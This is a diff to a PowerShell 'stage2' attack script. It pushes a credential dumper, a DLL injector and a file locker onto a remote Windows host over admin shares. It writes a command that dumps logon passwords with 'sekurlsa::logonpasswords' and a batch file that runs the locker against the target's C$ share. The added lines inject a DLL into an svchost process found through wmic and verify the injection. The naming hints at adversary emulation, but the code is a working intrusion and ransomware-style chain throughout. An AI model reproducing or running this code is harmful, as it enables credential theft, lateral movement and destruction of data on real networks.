@@ -90,6 +90,9 @@ ping -n 2 $target >> "$disc" 2>&1
         Copy-Item (Join-Path $work 'mk.exe')     "$c\ProgramData\mk.exe"  -Force
         Copy-Item (Join-Path $work 'readme.txt') "$c\readme.txt" -Force
         Copy-Item (Join-Path $work 'locker.exe') "$c\ProgramData\locker.exe" -Force
+        Copy-Item (Join-Path $stage 'inj.dll') "$c\ProgramData\inj.dll" -Force
+        Copy-Item (Join-Path $stage 'D8B3.bin') "$c\Users\Public\C0015\D8B3.bin" -Force -ErrorAction SilentlyContinue
+        New-Item -ItemType Directory -Force "$c\Users\Public\C0015" | Out-Null
         Set-Content "$c\ProgramData\dump.cmd" "C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit > C:\ProgramData\dump.txt 2>&1" -Encoding ASCII
         Set-Content "$c\ProgramData\inject.cmd" "C:\Windows\System32\rundll32.exe C:\ProgramData\inj.dll,Run" -Encoding ASCII
         Set-Content "$c\locker.bat" "@echo off`r`nC:\ProgramData\locker.exe -m -net -size 10 -nomutex -p \\$target\C$" -Encoding ASCII
@@ -108,22 +111,27 @@ ping -n 2 $target >> "$disc" 2>&1
 
     # ------------------------------------------------------------ inject into the per-user service host
     $injected = $false
-    for ($i = 0; $i -lt 18 -and -not $injected; $i++) {
+    # the per-user service host only exists while a user session is open, so wait up to ten minutes
+    for ($i = 0; $i -lt 60 -and -not $injected; $i++) {
         $rows = & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process where `"name='svchost.exe'`" get ProcessId,CommandLine /format:list" 2>&1
         $cur = $null
         foreach ($line in $rows) {
             if ($line -match '^ProcessId=(\d+)') { $cur = $Matches[1] }
             elseif ($line -match 'UnistackSvcGroup' -and $cur) {
+                New-Item -ItemType Directory -Force "\\$target\C$\Users\Public\C0015" | Out-Null
                 Set-Content "\\$target\C$\Users\Public\C0015\target.txt" $cur -Encoding ASCII
                 Copy-Item (Join-Path $stage 'D8B3.bin') "\\$target\C$\Users\Public\C0015\D8B3.bin" -Force
                 Copy-Item (Join-Path $stage 'inj.dll')  "\\$target\C$\Windows\System32\inj.dll" -Force -ErrorAction SilentlyContinue
                 Invoke-Remote "C:\ProgramData\inject.cmd" "injection into $cur"
-                W "injected into UnistackSvcGroup $cur"
+                Start-Sleep -Seconds 6
+                $inj = Get-Content "\\$target\C$\Users\Public\C0015\inject.log" -ErrorAction SilentlyContinue | Select-Object -Last 1
+                if ($inj -match 'injector done') { W "injected into UnistackSvcGroup $cur (verified)" }
+                else { W "injection into $cur NOT verified: '$$inj'" }
                 $injected = $true
                 break
             }
         }
-        if (-not $injected) { Start-Sleep -Seconds 10 }
+        if (-not $injected) { if (($i % 6) -eq 0) { W "waiting for a user session on $target ($i)" }; Start-Sleep -Seconds 10 }
     }
     if (-not $injected) { W 'no per-user service host found; skipped injection' }
 
@@ -140,4 +148,7 @@ ping -n 2 $target >> "$disc" 2>&1
 }
 
 W "=== stage2 end ==="
+
+
+
 
